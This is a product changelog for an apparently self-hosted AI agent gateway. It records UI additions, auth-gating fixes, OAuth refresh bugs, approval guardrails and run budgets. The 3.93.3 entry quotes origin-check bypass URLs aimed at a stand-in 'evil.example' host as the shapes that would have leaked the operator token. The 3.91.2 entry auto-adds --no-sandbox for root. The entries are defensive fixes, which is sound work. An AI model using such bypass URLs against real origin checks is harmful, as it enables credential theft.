now survive discovery for future use. Suite 1413/0.

## 3.97.1 — eviction stream: operator token out of the URL

Security-review follow-up on 3.97.0: the eviction live stream carried the operator
token as a `?token=` query param (EventSource can't set headers) — URLs land in
access logs and proxies. The stream is now a fetch-based SSE reader, so the token
travels as a header via the same wrapper as every other call; lastEventId resume
and decorrelated backoff kept. Verified live: stream reconnects "live" post-restart,
and no `?token=` carrier remains anywhere in either UI.

## 3.97.0 — every editable surface on the web UI: 8 new Control sections + auth sweep

The 8-gap close: every gateway capability that was editable only via API/CLI now has a
Control-UI section, each verified by real clicks on the operator display. New sections:
**Automations** (cron jobs: create/run-now/delete, humanized schedules, cron activity),
**Alerts** (status, history, test-fire, PagerDuty setup/policies/levels/webhooks),
**Skills** (catalog, outcome stats, proposal review queue with Install/Reject),
**MCP** (tools list + call console), **Images** (providers, generate with inline render,
job history), **Sessions** (live session list, create, peer binding, transcript reader),
**Subagents** (spawn/view/merge), **Memory** (agent memory file viewer). Health & Ops
gains Reload-config and Run-and-record-doctor buttons.

Security sweep (all pinned in the both-modes auth matrix test):
- **/cron/jobs leaked the full config** — every job carried `_cfg` with the gateway
  token, Telegram bot token and the live OAuth access token. Responses now strip
  `_cfg`/`handler` (test: cron-jobs-leak).
- **9 route families were in NEITHER auth branch** — /alerts, /media, /memory,
  /transcripts, /checkpoints, /skills, /eval, /tokens, /profile (+ /computer/*,
  /events/*, /doctor, /webhooks/pagerduty/recent). Unauthenticated callers could fire
  real pages, spend money on image jobs, install skills and read conversation
  transcripts. All token-gated in BOTH strict and legacy modes; HMAC webhook ingest
  stays open; the eviction EventSource carries the token via query param.

Real bugs found by clicking:
- POST /media/jobs never awaited the async job — every caller got literally `{}`.
- Image generation was dead end-to-end: the HTTP route only looked at env vars for
  credentials (now resolves the per-provider credential store like the agent tool),
  the xai registration pinned retired `grok-2-image` (now tracks the imagine matrix),
  the provider always sent `size` which xAI rejects outright (now only when asked),
  and xAI's string-shaped error bodies were swallowed. Verified: UI Generate → real
  grok-imagine-image render inline.
- Installing a skill proposal left it in the review queue (second click errored) —
  install now archives the source to installed/.
- New route: POST /skills/proposals/decide (filename-scoped; traversal 400s).
- GET /memory?full=1 returns bounded bodies for the viewer.

Suite 1409/0 (5 env-gated skips).

## 3.96.1 — Swarm section verified on-screen + phantom approvals badge fix

Eyes-on check of the Swarm view on the operator display: runs table with status pill + live count, the View drill-down (full run JSON incl. child subagent ids), merges table, live stream, checkpoints — all verified working (the Run + live SSE path was already proven end-to-end earlier by a real 2-node run). One cosmetic-but-real bug caught by looking: the pending-approvals nav badge rendered a phantom "0" when it should be hidden — `.nav-badge`'s `display:inline-flex` overrode the `hidden` attribute (same defeat-the-hidden-attribute class as the 3.94.0 stop-button). `.nav-badge[hidden]{display:none}` added; verified computed style. Suite 1400/0.

## 3.96.0 — full-robustness pass: every section audited, first-run login, live console

The three things standing between the web UI and an honest "fully robust" (operator-demanded):

**Every section audited.** Endpoint sweep of all 44 URLs the Control UI calls + click-through of the six never-audited views (Swarm, Approvals, Agents & Jobs, Health & Ops, Cost & Evals interiors, Overview). Result: one more dead-route family — the **Pairing** panel's `/pairing/pending|approve|revoke` never existed (5th such family). Wired to the real file-backed pairing store (routes/security.mjs; the gateway now dispatches `/pairing/*` there too), auth-gated, 3 route tests. Everything else verified rendering real data: swarm runs + live status, checkpoints, job queue + admission live, approvals + policy, dashboard, doctor, cron logs, eviction viz LIVE, eval baseline 21/21, scoreboard, skills.

**First-run login.** A fresh install on a strict gateway used to show silent "unauthorized" panels with no way in (the token had to be hand-planted in localStorage). Any same-origin 401 now raises a token-entry overlay — in both Control and WebChat — that verifies the token against a protected endpoint before reloading. Live-proven: cleared token → overlay → wrong token rejected with a clear message → real token → console loads. Tokenless lab installs never see it.

**Live console.** The gateway now broadcasts `security`/`budget` loop events on the existing WS hub, and the Control UI reacts: a pulsing pending-approvals badge on the nav (visible from any view) and a live-refreshing Approvals table. Live-proven end-to-end: fired a guarded bash via the API without touching the console — badge appeared with "1" and the approval row rendered unprompted; denied it from the UI — badge cleared. Also: display :10 screensaver/DPMS disabled so the operator console stays visible.

Suite 1400/0.

## 3.95.4 — Channels panel: live status pills were silently broken since 3.90.0

Checking the Channels section on the operator display: config management was complete (all 5 channels, per-field saves, secrets never echoed, Restart) — but no live status anywhere. Root cause: `channelManager.status()` returns an **array** of `{name, running, …}` while `mergeStatus` indexed it like a **map** keyed by id — `array["telegram"]` is always undefined, so the status merge silently never happened and the UI's (already-written!) running pill never rendered. `mergeStatus` now accepts both shapes; the row shows **running · N msg** (green, with bot username + last-ok tooltip), **stopped** (red, with the last error) for enabled-but-dead channels, and an **err** pill when a running channel carries a lastError. 2 regression tests. Live-verified on the display: Telegram shows "running · 0 msg" (@xxclaw_bot). Suite 1397/0.

## 3.95.3 — fix: the test suite was making a real paid grok-4.5 call on every run

Found by looking at the new Logs section on the operator display: recurring `noop` grok-4.5 rows at ~10.8K prompt tokens each lined up exactly with `npm test` runs. `test/session-kill-loop.test.mjs` assumed deleting `XAI_API_KEY` meant no credential — but since credentials moved into the profile store (3.86.0), the key resolved from `~/.xclaw` anyway, so every suite run executed a REAL grok-4.5 request and wrote it to the REAL cost ledger. Tally before it was caught: **38 calls · 402K tokens · $0.55**.

The test is now hermetic: temp HOME + `XCLAW_STATE_DIR` (no stored credential can resolve), baseUrl pinned to a dead loopback port (nothing can escape even if one does), ledger disabled, env restored and temp dir cleaned in `finally`. Proven: full suite run adds **zero** ledger rows. The 38 historical rows stay in the ledger — the spend was real and the ledger is truthful.

## 3.95.2 — Usage & Logs: provider selection live-syncs across open Control windows

Observed on the operator display with two Control surfaces open: both share the persisted provider selection but didn't live-sync — one window could show anthropic while the other showed nvidia, exactly the cross-provider confusion this section exists to prevent. A storage-event listener now converges every open window on the same selection instantly.

## 3.95.1 — security: /cost·/usage·/logs were strict-mode-only protected

Automated review of the 3.95.0 commit caught that the new `/cost`, `/cost/pause`, `/usage` and `/logs` paths were added only to the STRICT auth list — on a non-strict deployment with a token set, `POST /cost/pause` (state-changing: pauses ALL spend) and the session-preview-exposing usage/logs reads were unauthenticated. Now protected in both branches, with a matrix test asserting token-required + token-accepted across strict AND legacy modes for all five paths. Suite 1395/0.

## 3.95.0 — Usage & Logs: per-provider analytics console (xAI-console style)

New "Usage & Logs" section in the Control UI, modeled on the xAI console's Usage/Logs pages — with **provider separation as the organizing principle**: a provider chip bar (All · xai · anthropic · nvidia · …) rescopes every chart, breakdown, model table and log row together, so one provider's traffic can never be confused with another's.

**Usage**: spend / tokens / requests stat tiles with per-day zero-dep SVG charts (tokens stacked by type: prompt · cached · completion · reasoning), 7d/30d range, token-type breakdown table with share bars, and a by-model table (runs · tokens · spend).

**Logs**: one row per API request (time, provider badge, model, in/out/cached tokens, USD, message preview), filterable by run id / model / session / message text, newest first — click any row for the full run drill-down (all turns, cache stats, session, raw JSON).

**Data layer** (`src/tokens/usage-analytics.mjs`): aggregates the existing cost ledger — whose `turns[]` already record per-request token detail — instead of inventing a second store. Ledger entries now carry `provider` + `runId` (loop persists them); pre-3.95 entries infer provider from the model name. New token-gated routes: `GET /usage`, `GET /logs`, `GET /logs/run`.

Two bugs caught during the build by its own tests: daily buckets were built but never stored (charts rendered flat while totals were right), and synthetic run ids for legacy entries were computed from the filtered index in the list but the unfiltered index in the detail lookup — drill-down missed. Both fixed; 7 analytics tests including provider-separation no-leakage and the bucket regression. Suite 1393/0. Live-verified with screenshots: All + anthropic views, charts, breakdown, provider-scoped logs, drill-down.

## 3.94.5 — Cost & Evals: inbound/outbound token columns + governor card were dead

Operator report: the ledger's In/Out token columns were all dashes and the governor section empty. Three defects, one view:

- **In/Out columns + summary read wrong field names.** The ledger API emits `promptTokens`/`completionTokens` per row and `runs`/`costUsd`/`path` at the top level; the panel read `inputTokens`/`prompt_tokens`/`count`/`totalUsd`/`ledgerPath` — none of which exist. The data was in the payload the whole time. Now mapped correctly, with thousands separators, an `~` marker on estimate-only rows, and a richer summary: runs, total tokens in (prompt), total tokens out (completion), total USD, ledger file.
- **Cost governor card said "not found" and Pause/Resume were dead.** The card called `GET /cost` and the buttons `POST /cost/pause` — routes that never existed, while a full governor implementation (`src/tokens/cost-governor.mjs`: daily soft/hard USD caps, spend ledger, pause) sat unwired. Both routes now exist (in routes/tokens.mjs), token-gated via the strict auth list. Live-verified: card shows $5/$15 caps + spend + pressure; Pause→paused:true→Resume→false round-trip through the real buttons.
- 3 route tests including a contract guard on the row field names the UI binds to.

Suite 1386/0.

## 3.94.4 — fix: running gateway never refreshed the active OAuth token mid-flight (the outage, not fully closed)

The "did auto-refresh work?" question surfaced that 3.92.1 only half-fixed the 2026-08-13 outage. The refresh *logic* worked — but the running gateway never reached it for the **active** provider, so it was only masked by frequent restarts (each `loadConfig` refreshes).

`loadConfig` caches the active provider's OAuth token into `cfg.agent.apiKey` at boot. Then **both** `resolveProviderRouteAsync` (the per-request hot path) **and** `resolveProviderToken` (step 1) short-circuited on that static snapshot — the `resolveProviderToken` call that checks expiry and refreshes sat behind an `if (!apiKey)` that was never true. A gateway running past the token's ~8h lifetime kept sending the dead cached token → 401 → outage, exactly as before.

Fix: when the active provider is OAuth-backed (`cfg.agent.authMode === "oauth"`), the hot path bypasses the boot cache (new `freshOAuth` option on `resolveProviderToken`) and resolves through the profile store each run, which checks expiry and refreshes near the boundary. API keys don't expire → they keep the fast cached path, and healthy OAuth tokens don't refresh either (proven: 3 resolutions on an 8h-out token, zero rotations — no per-request storm).

Live-proven end to end on the real token: forced near-expiry → the hot path minted a fresh token per-request (`:refresh` source, ~8h expiry) → the new token authenticated (10 models). 3 regression tests (refreshes near expiry, no storm when healthy, `freshOAuth` bypasses the cache). Suite 1383/0.

## 3.94.3 — provider page: live credential health check + unknown-provider validation

Two gaps found auditing the Providers page for robustness:

**Live health check (the "is this key actually working?" feature).** Every provider row gains a **Test** button and a status dot. `POST /providers/manage/verify` first confirms a credential resolves, then makes a forced, uncached, real `/models` call — credential *resolving* is not the same as *authenticating* (the 2026-08-13 outage had a resolving-but-dead token). Dot goes grey (untested) → amber (testing) → green (`live · N models`) or red (`no credential` / `auth failed`), with the failure reason in the tooltip. Live-verified: Anthropic green with 10 models via the OAuth profile, a keyless provider red at the credential stage.

**Unknown-provider validation.** `POST /providers/manage/key` (and `base-url`, `use`, `verify`) accepted any provider string — POSTing a key for `"notreal"` returned `ok:true` and wrote an orphan `notreal:default` profile to disk that never showed in the inventory. All create/mutate paths now reject providers not in the known list (`400 unknown provider`); delete/prefer already no-op on non-existent profiles. 5 new route tests. Also updated the panel copy (OAuth is in-UI now, not CLI-only).

Suite 1380/0.

## 3.94.2 — OAuth login from the web UI (was CLI-only)

The Providers page could store API keys but OAuth said "use the CLI". Now the whole flow runs in the browser:

- **`POST /providers/manage/oauth/start`** — for paste-code PKCE providers (Claude/Anthropic) returns the authorize URL + state; the PKCE verifier never leaves the gateway (in-memory, 10-minute TTL, single-use, size-capped). Providers whose flows can't run as a browser round-trip (xai/openai need env-configured client ids + local callbacks) return the exact CLI command instead of a dead button.
- **`POST /providers/manage/oauth/complete`** — exchanges the pasted code (`CODE` or `CODE#STATE`) through the existing `exchangeAnthropicAuthCode` core and stores the profile via `loginOAuthTokens` — same result as `xclaw providers oauth`, tokens never echoed back.
- **UI**: every provider row gains an **OAuth login** button — for Anthropic it opens the Claude approval tab and shows a paste-code field + Complete right in the row (then auto-fetches live models); for others it shows the CLI command inline. Both the routes and the whole `/providers/manage` plane remain operator-token gated (the old "OAuth stays CLI-side" comment predated that gate and is corrected).

4 new tests: authorize URL + state (verifier never serialized), CLI fallback, unknown/expired state rejection, and a full start→complete exchange against a mocked token endpoint asserting the verifier reaches the token endpoint, the profile stores and resolves, tokens are never echoed, and the state is single-use. Live-verified in the UI: Anthropic row shows the paste-code flow, xai row shows the CLI command. Suite 1376/0.

## 3.94.1 — Control UI restructured into a sectioned console (was: one endless scroll)

Operator feedback: everything lived on a single page — 22 panels in one scroll. The Control UI is now a proper sectioned console:

- **Grouped sidebar navigation** — Monitor (Overview · Health & Ops · Cost & Evals), Run (Agents & Jobs · Swarm · Approvals), Configure (Providers · Channels). One view at a time, hash-routed and deep-linkable (`#/swarm`, `#/providers`, …), mobile slide-in nav.
- **Zero logic risk**: every panel kept its element IDs, so the existing `app.js` bindings work unchanged; the restructure is markup + styles + a ~30-line router. Design tokens now match the new WebChat (crimson accent, same dark system).
- **Two long-dead panels resurrected**: the Gateway status card had shown "not found" and Eviction/LRU "unavailable" ever since the `/status` and `/config` routes were dropped in an old refactor — silently, because nothing tested them. Both now read the sanitized `/gateway/info`, which gained non-secret `agent.provider` and an `eviction` summary block (a raw `/config` dump would leak secrets, so it stays gone).
- Also fixed: two sections shared `id="cardChannels"` (invalid HTML, `getElementById` ambiguity); channel status rows now cover Slack/Email too; sticky table headers.

Live-verified: all 8 views route with the correct panels, Overview cards populate with real data (host/provider/model/auth mode/version, eviction config, channel states), Providers renders as its own page with live credential badges. Suite 1372/0.

## 3.94.0 — the new WebChat: streaming markdown, live tool timeline, inline approvals, in-chat images

Full rewrite of `ui/webchat/` (zero dependencies, ES modules) — the front end finally shows what the backend already does:

- **Streaming-first**: `model/delta` events render as progressive markdown with a caret, throttled via rAF; Stop button aborts the stream mid-turn.
- **Safe markdown + code**: new `ui/webchat/markdown.mjs` — escape-first renderer (headings, lists with nesting, tables, blockquotes, fenced code with a zero-dep syntax highlighter for js/py/sh/sql families, protocol-filtered links) with 16 unit tests including XSS cases (script tags, event-handler attributes, `javascript:` and protocol-relative links).
- **Live tool timeline**: every `tool start/end` event becomes an expandable card — status dot (running-pulse/ok/fail), args, duration, result preview.
- **Inline approvals**: `security/approval_required` renders an amber card with the exact command and Allow/Deny buttons wired to `/security/decide` — approve guarded bash without leaving the conversation. Budget/guard events render as notices.
- **In-chat images**: generated images from the tool trace render inline via the new `GET /artifacts/file` route — strict workspace containment (traversal + symlink-escape tested, extension allowlist, size cap; `src/gateway/artifact-file.mjs`, 7 tests).
- **Sessions sidebar**: history list with message counts and relative times, switch/restore, New chat; status dots (gateway/computer), model + version chips; message actions (copy/retry), suggestion chips with the preserved shown/tapped feedback loop; empty-tool-turn replies fall back to the last tool output instead of "(no response)"; responsive down to mobile with a slide-in sidebar.

**Security fix (found during the build): `/gateway/info` leaked the operator token.** The route returned `gateway: cfg.gateway` verbatim — token included — while being deliberately reachable without auth (UIs poll it for status). Any unauthenticated loopback caller got the key to every token-gated API. Now a sanitized subset (`tokenSet`/`authStrict` booleans, host/port); regression test asserts no token-shaped value in the payload.

**Also fixed**: the static server had no MIME entry for `.mjs` (`application/octet-stream` → browsers hard-refuse ES module imports — would have broken any module-based UI); stop button visible when hidden.

Suite 1372/0 (24 new tests). Live-verified end-to-end on display :10: streamed markdown tour (tables/code/quotes), guarded bash approved via the inline Allow button (card → ✓ allowed → tool card 26ms → output), generated image rendered in-chat via `/artifacts/file`.

## 3.93.3 — webchat token support + origin-check hardening of the 3.93.2 fetch wrapper

Two follow-ups from actually using the UIs on a screen:

**WebChat had zero token support.** With `gateway.authStrict` (this host's config) the `/channel/` API is token-gated, and the webchat client never sent one — every message failed `401 unauthorized`. The same central same-origin fetch wrapper as the control UI now attaches `localStorage.xclaw_token` when present; tokenless lab setups are unchanged (nothing is sent when nothing is stored). Live-verified: message sent through the real UI, streamed reply rendered.

**Security: the 3.93.2 wrapper's origin check was bypassable** (caught by automated review of the pushed commit). `u.startsWith("/")` matches protocol-relative URLs (`//evil.example/x`), and `u.startsWith(location.origin)` is prefix-spoofable (`http://host:port.evil.example`) — both would have sent the operator token cross-origin if a call site ever fetched an attacker-influenced URL. Both wrappers now resolve the real target via `new URL(raw, location.href)` and compare `.origin` strictly; `Request` objects are unwrapped via `.url`. Verified in-page: both bypass shapes now resolve to non-same-origin (no token), relative and absolute same-origin still pass.

## 3.93.2 — fix: control UI sent the operator token on 1 of ~35 gateway calls

Found by actually putting the control UI on a screen: exactly one call site attached `x-xclaw-token`, so every operator-gated panel (swarm merges, providers, channels, queue controls, …) showed "unauthorized" even with a valid token in `localStorage.xclaw_token`. Now a central same-origin `fetch` wrapper attaches the token for every gateway call — existing and future call sites alike (the WS events path already carried it via the subprotocol; unchanged).

Operational note from the same session, for anyone hosting UIs on this box: do **not** open xclaw UI tabs inside the sudo-ai grok-oracle warm browser (CDP :9223) — that browser is actively driven by another agent's synthetic clicks/typing, which will wander your tab and press your buttons (observed: an unintended 2-node swarm run started by a stray click on "Run + live SSE"). The control UI gets its own dedicated Chrome instance/profile instead.

## 3.93.1 — fix: Telegram same-channel approval deadlock (poll loop blocked by the pending turn)

Found by live-testing the 3.92.0 approval flow over real Telegram: the getUpdates poll loop `await`ed every update handler inline, so a turn blocked on human approval (up to 120s) froze the loop — the owner's `/approve` (or the inline Allow tap) could not even be *read* until the SLA had already denied the approval, which then failed with `unknown_pending`. Same-channel approval was structurally impossible over polling (webhook transport was unaffected — independent HTTP requests).

`poll-loop.mjs` dispatch policy: callback_query updates and slash-command messages are handled inline (fast — no LLM) so they overtake a blocked turn; all other messages go to per-chat serial queues, preserving in-chat ordering while the loop returns to getUpdates immediately. Different chats may now process concurrently (previously global-serial) — for the DM-locked single-owner deployment this is effectively unchanged.

4 new tests including a faithful reproduction of the deadlock (approve arrives mid-blocked-turn, must complete before the turn does). Live-verified over real Telegram end-to-end: bash request → approval prompt with Allow/Deny buttons → `/approve` from the same chat while pending → `Approved` + command output delivered 15s after the request (previously: 120s SLA deny). Suite 1353/1348 pass.

## 3.93.0 — ship-readiness closeout: outage-proof doctor, automations locking, tool execute-smoke sweep

Closes the three gaps identified in a ship-readiness review after 3.92.1: doctor could go green through an outage, the automations store had a lost-update race, and nothing exercised tool bodies to catch the "shipped with a missing import" bug class generically.

**Doctor now makes a real, forced authenticated call to the active provider** (`providers.liveCheck`), not just a credential-resolution check — status ERROR (not warn) so hourly doctor-cron's `notifyOnFail` actually pages the operator. Credential *resolving* is not the same as credential *working*: the 3.92.1 outage had a token that resolved fine (a separate bug) for 9 hours while every real request 401'd. Opt out per-environment with `doctor.providersLiveCheck: false` (existing doctor tests set this so they stay hermetic).

**Automations store race fixed** (`src/automations/store.mjs`, `src/automations/index.mjs`): `executeAutomation` used to read the store once, await a multi-second-to-minute LLM call, then save that same stale in-memory snapshot — silently clobbering any write another process made in the meantime (a manual `automations run` racing the gateway's own scheduled tick, or an unrelated `add`/`delete`). Now: (1) a new `withStoreLock` always operates on a freshly-loaded copy under an exclusive cross-process lock (`src/browser/fabric-lock.mjs` generalized with an optional `root` — the same proven exclusive-lockfile-with-stale-pid-reclaim algorithm already used for fabric state, not duplicated); (2) an in-process guard rejects overlapping executions of the *same* automation instead of double-ticking it. 3 new tests reproduce the exact race (slow + fast writer to different automations; same-id overlap; lock sees prior writes) and pass only with the fix.

**Tool execute-smoke sweep** (`test/tools-execute-smoke.test.mjs`): calls `execute()` on every registered local tool (24) and every browser tool (21, via a stub computer client) with minimal args chosen per-tool so nothing reaches a real network call, paid API, or slow subprocess — asserts none throw. This is a smoke test, not full behavioral coverage, but it directly re-creates how the 3.91.1 born-broken-tools bug was found and generalizes that discovery method across the whole tool surface. Verified it actually catches the regression class: reintroducing the exact missing-import bug in browser-tools.mjs makes this test fail with the same `ReferenceError` as the original incident, restoring it passes again.

Suite 1349/1344 pass (5 pre-existing host-quirk skips), all new tests included.

## 3.92.1 — fix: live outage — anthropic OAuth token sat expired for 9 hours, never refreshed

Discovered live: a goal-automation e2e test hit a real 401, and so did the running gateway itself when probed directly — `@xxclaw_bot` had been unable to answer any Anthropic-backed request for roughly 9 hours with no visible error to the operator (the failure surfaced only as "Anthropic HTTP 401: OAuth access token has expired").

Root cause was two compounding bugs in `src/auth/profiles.mjs`, not the "connected token refresh scheduler" (that scheduler covers a different subsystem — third-party connected-app integrations — and was never involved in refreshing provider credentials at all):

1. **The expiry check silently never fired.** `anthropic-oauth.mjs` stores `expiresAt` as a raw epoch-ms **number** on every exchange/refresh. `credentialFromProfile`'s staleness check called `Date.parse(profile.expiresAt)` — which only understands strings; called on a number it returns `NaN`, and `Date.now() > NaN - 30000` is always `false`. The token has looked "not expired" to xclaw since the moment it actually expired.
2. **Even a firing check refreshed through the wrong OAuth server.** The one generic refresh path (`refreshProfileOAuth`) defaults to xAI's token endpoint and client id (`auth.x.ai/oauth/token`) for every provider — there was no Anthropic-specific dispatch, so a correctly-detected anthropic expiry would still have failed.

Fixed both: a `parseExpiresAtMs()` helper accepts numeric or ISO-string `expiresAt`; `refreshProfileOAuth` now dispatches anthropic profiles to `anthropic-oauth.mjs`'s own `refreshAnthropicOAuthToken` (real token endpoint, real Claude Code client id, JSON body shape) instead of the xAI-shaped generic path. 4 new tests, including one with a mocked `fetch` asserting the refresh request target is Anthropic's endpoint, not xAI's — it fails against the pre-fix code.

Live-verified: manually triggered the fixed refresh (real network call, real token returned, profile store updated with a fresh ~8h expiry), restarted the gateway, and a real webchat turn through Anthropic succeeded again. Suite 1341/0 (1336 pass, 5 pre-existing host-quirk skips).

## 3.92.0 — unattended-operation guardrails: approval mode live, commit gates config knob, per-run budgets, goal-mode automations

Frank opted into "full autonomy prep." Three slices, each flag-gated and default-compatible:

**1. Approval guardrails applied + config-driven commit gates.**
- The live host config now runs `security.autoApprove: false` — the `requireApproval` list (bash, file writes) actually gates: the tool call pends, the owner resolves it with the existing `/pending` + `/approve <id>` channel commands (Telegram inline keyboards included), SLA timeout denies. Live-verified round-trip: bash pended → `/approve` → executed.
- New `security.commitGates: true` config knob — the gateway exports `XCLAW_COMMIT_GATES=1` at startup (env still wins) so browser fabric commit gates are declarative instead of env-only. Doctor's prod check accepts either.
- FIX: webchat slash commands crashed the non-stream HTTP route ("Cannot read properties of undefined (reading 'content')") — the command branch returned no `reply` field. Every `/pending`, `/approve`, `/help` via `POST /channel/webchat/message` 500'd; Telegram/stream were unaffected, so it hid.

**2. Per-run budget caps** (`src/agent/run-budget.mjs`): `cfg.agent.budget = { maxToolCalls, maxTokens, maxWallMs }` — each optional, active when > 0, checked at every turn boundary. On exceed the run stops gracefully (`budget` event + "Stopped: run budget exceeded" final text; post-run pipeline still runs). Tokens come from the existing usage tracker (real usage or estimates). Off by default. Includes the source-assertion tripwire against refactor drops.

**3. Goal-mode automations** (`src/automations/goal.mjs`): `xclaw automations add --goal [--max-ticks N] -- <goal>` creates a `mode: "goal"` automation. Each scheduled tick composes a prompt from the goal + persisted state (plan, last progress notes, tick count), the agent does one useful step and ends with a fenced `xclaw-goal-state` JSON block (`plan` / `progressNote` / `done`), and the automation folds it into durable state. It self-disables on `done: true` or maxTicks (default 20). Unparsable replies burn a tick with a marker note — no infinite loops. Plain prompt automations are byte-for-byte untouched. This closes the "automations can't pursue open-ended goals across self-directed steps" gap; combined with approval mode + budgets, long unattended loops now have re-planning, spend ceilings, and human checkpoints.

Suite 1332/0 (13 new tests).

## 3.91.2 — fix: browser dead on root-run hosts (Chrome refused to start without --no-sandbox)

The live bot self-reported "my browser is navigate + read-only, no click/type/screenshots" — wrong diagnosis, real symptom. The bundle engine's full CDP browser was configured and advertised (`jsCode`, `screenshot`), but every launch died with `Browser exited before getting port`: Chrome hard-refuses to start as root without `--no-sandbox`, and `chrome-args.mjs` only added the flag for CI / docker / explicit `XCLAW_BROWSER_NO_SANDBOX`. Bare-metal root hosts (this one) got a browser that could never start.

- `buildChromeArgs` now detects uid 0 and adds `--no-sandbox` automatically (the bundle picks this up through the chrome-args bridge — no bundle change). Regression tests cover root-forces-flag and non-root-keeps-sandbox.
- Verified live end-to-end after restart: direct computer call (DOM mutate + same-tab readback + desktop screenshot) and through the real agent flow — the bot filled and submitted the httpbin.org test form via `jsCode` and read back `custname: "XCLAW_FORM_TEST"` from the response.

Corrections to the bot's other self-report claims, for the record: the computer engine already *was* `bundle` (not `native`); a gateway token *is* set; localhost being blocked is the SSRF guard working as designed; env API keys "missing" is env-policy stripping secrets by design (keys live in the provider credential store). Suite 1321/0.

## 3.91.1 — fix: every live bash call rejected by the bundle engine + 21 browser tools born broken

Two live-bot-breaking bugs, both found from the running gateway's own logs (`ALRIGHT RECHECK AGAIN` turn, 2026-08-13 01:43):

**1. `xclaw_bash` failed on every call with `InputValidationError: unrecognized key 'systemRunPlan'`.**
The approval path freezes a `systemRunPlan` and the loop/router inject it into exec-tool args so the computer plane can enforce it at spawn (3.81.0 design). The module engines accept the key — but the opt-in CDP **bundle** engine validates input with strict zod and rejected the whole call. With `security.autoApprove` + plan binding active, that meant *every* bash call through the live bot died before running.

- `modules/bash-tool.mjs` now declares `systemRunPlan` in its input schema, so engines built from modules *advertise* support.
- The loop reads that advertisement from `listTools` and passes `computerAcceptsRunPlan` to the tool router.
- When the engine can't accept the key, the router runs the same `assertPlanAtSpawn` gate the module engine would run — gateway-side, fail-closed — then strips the key before forwarding. Plan enforcement is preserved, not dropped: a drifted plan is denied without the computer ever being called (regression-tested).
- Second latent bug this surfaced: plans were frozen against `security.planRoot || process.cwd()` (the gateway's launch dir), so the spawn-time cwd pin *always* drifted from the session workspace (`cwd drift at spawn (plan=/root/xclaw live=/root/.xclaw/workspaces)`) — masked until now because the bundle rejected the key before any cwd check ran. The loop now binds exec plans against the run's `workingDir` (model-supplied `cwd`/`workingDir` still wins).

**2. 21 browser tools were born broken — `fabric_status` → `fabricStatus is not defined`.**
`src/tools/browser-tools.mjs` (single Grok bulk commit) only ever imported the mitm helpers; the lease/gate/fabric/sense/truth/timetravel/role tools referenced 22 identifiers from six modules that were never imported. Every `execute` of `tab_lease`, `commit_gate`, `fabric_status`, `session_role`, `browser_assert` (mitm-on path), `mitm_policy`/`mitm_export`, `trace_replay`/`trace_score` was a guaranteed ReferenceError. The suite stayed green because nothing invoked them — closed with imports plus `test/browser-tools-integrity.test.mjs` executing the previously-broken read-only paths.

Verified live end-to-end through the running gateway (webchat → agent loop → router → bundle computer): `xclaw_bash` returns real output with a bound plan, `fabric_status` returns a real fabric snapshot. Suite 1319 tests / 0 fail.

## 3.91.0 — full doctor: Providers + Channels + Services sections

`xclaw doctor` now covers the provider/channel subsystems and the live bot, not just config/security/computer/runtime:

- **Providers**: summary (N/12 configured + active provider/model), per-configured-provider credential resolution (does the `apikey`/`oauth` profile actually resolve, and via which source) + endpoint, and an image-generation readiness check (xai credential).
- **Channels**: summary (enabled/total), per-channel enabled/configured state + which fields are set, and live Telegram bot reachability (`getMe`) when a token is configured.
- **Services**: pm2 `xclaw-gateway` status (online/restarts/uptime) so the persistent bot's health shows in the report.

New display groups (Providers, Channels) slot between Security and Computer. No secrets are printed — only resolution booleans and sources.

## 3.90.4 — hide the {"claims"} grounding block from channel replies

The system prompt asks the model to append a ```json {"claims":…,"evidence_ids":…} ``` block for internal grounding, but it was leaking verbatim into user-facing replies (Telegram, etc.). `stripClaimsBlock` now removes the trailing fenced or bare claims object from the presented `text` field only — the raw reply is kept for internal verification/claims consumers. Unrelated JSON (e.g. a config example) is left untouched.

## 3.90.3 — deliver agent-generated images to Telegram (was text-only)

The bot could generate an image but only sent the text description — the picture stayed on the server, because the Telegram outbound path had no local-file photo upload (only voice used multipart).

- New `channels/telegram/photo-out.mjs` — multipart `sendPhoto` for a local image file, falling back to `sendDocument` if Telegram refuses it (mirrors voice-out).
- The agent turn now surfaces produced image paths: `base.mjs` extracts image artifacts (png/jpg/webp/gif) from the tool trace's collected artifacts into an `images` field; `runtime.mjs` passes them through `processInbound`.
- The Telegram reply path uploads each produced image as a photo after the text reply (cap 10/turn).

Verified live: a generated image was delivered to a real chat via `sendPhoto` (message_id returned). Suite 1308/0.

## 3.90.2 — image generation uses the xai provider credential (not XAI_API_KEY env) + current models

Image generation failed with "XAI_API_KEY not set" even when an xAI key was configured, because `generate_image`/`edit_image` read the `XAI_API_KEY` env var directly instead of the provider credential store.

- The image tools now resolve the xAI key via `resolveProviderToken(cfg, "xai")` — the same `xai:apikey`/`xai:oauth` credential configured through `xclaw providers` (env vars remain a fallback). `cfg` is threaded from the tool registry → `createImageTools` → the generate/edit tools.
- Fixed the stale image-model matrix: the retired `grok-2-image*` ids are replaced by the current `grok-imagine-image` / `grok-imagine-image-2.0` / `grok-imagine-image-quality` (old ids kept as fallbacks).

Verified live: `generate_image` produces a real PNG using the stored `xai:apikey` profile with no `XAI_API_KEY` env set. Suite 1306/0.

## 3.90.1 — telegram dmPolicy manageable + live @xxclaw_bot setup

- Added `dmPolicy` (open|allowlist|pairing) to the Telegram channel spec so DM access control is manageable via `xclaw channels set --channel telegram --field dmPolicy` and the UI, alongside `allowedChatIds`. `allowlist` + a populated `allowedChatIds` hard-locks DMs to specific chat ids (others denied outright); the default `pairing` offers strangers a pairing request; empty `allowedChatIds` with `pairing` is open.

## 3.90.0 — channel management via CLI · TUI · web UI (mirrors providers)

Every channel (Telegram, Slack, Discord, Email, WebChat) is now manageable the same way as providers — CLI, interactive TUI, and the control-UI panel — instead of hand-editing config.

**Shared core** `src/channels/manage.mjs`: declarative `CHANNEL_SPECS` (per-channel fields with secret/required/type), `channelInventory(cfg)` (enabled + configured + per-field set/not-set, **secrets always redacted to booleans — values never returned**), `setChannelField(id,key,value|null)`, `setChannelEnabled(id,bool)`. Secrets stay inline in `cfg.channels.<id>` by existing design (config is chmod 600); writes go through `saveConfigPatch`.

**CLI** `xclaw channels`: `list` (aligned table — enabled channels first, then a `— disabled —` divider; per-channel status + which fields are set, secrets shown as `set` never values), `set --channel X --field K --value V [--clear]` (validated; secret fields confirm "stored — not echoed"; dot-paths like `email.imap.pass` nest; list fields split comma strings), `enable`/`disable`, and a sequential `setup` wizard over all five channels.

